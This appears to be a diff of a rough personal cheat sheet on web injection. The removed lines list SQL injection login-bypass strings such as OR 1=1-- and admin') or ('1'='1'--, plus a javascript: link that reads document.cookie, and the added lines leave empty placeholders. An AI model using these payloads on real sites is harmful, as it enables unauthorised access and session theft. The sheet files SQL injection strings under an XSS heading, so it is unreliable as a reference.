@@ -15,47 +15,40 @@ and not =/=
 #Cross Site Scripting
 
 Cross Site Scripting (XSS) attacks are a type of injectoin, in which scripts are injected into an otherwise 
-trusted and reputable website.
+trusted and reputable website. write more stuff here lol
 
 Some I like to give a crack are;
 
 XSS in HTML/Applications
+Basic Payload
 
-- ' or '
-- OR "" = "
-- '=0--+
-- 'LIKE'
-- - ' AND id IS NULL; --
-- '''''''''''''UNION SELECT '2
+- 
+- 
+- 
+- 
+-
+- 
 
 
 Bypass word blacklist with code evaluation
 
-- OR 1=1
-- OR 1=1-- 
-- OR 3409=3409 AND ('pytW' LIKE 'pytW
-- %' AND 8310=8310 AND '%'='
-- AND 1=1 AND '%'='
+- 
+- 
+-
+- 
+- 
 
 
-[a](javascript:prompt(document.cookie))
+XSS in HTML/Applications
+Img tag payload
 
-- admin') or ('1'='1'--
-- or true--
-- admin') or ('1'='1'#
-- ' or ''&'
-- admin') or ('1'='1'/
+- 
+-
+- 
+-
+-
  
  
-Ordre and Union based palloads
-
-  Open Linux VM and check which ones had the most promising outcomes based on previous use cases Novemeber calvin
-  
--
--
--
--
--
 
 
 
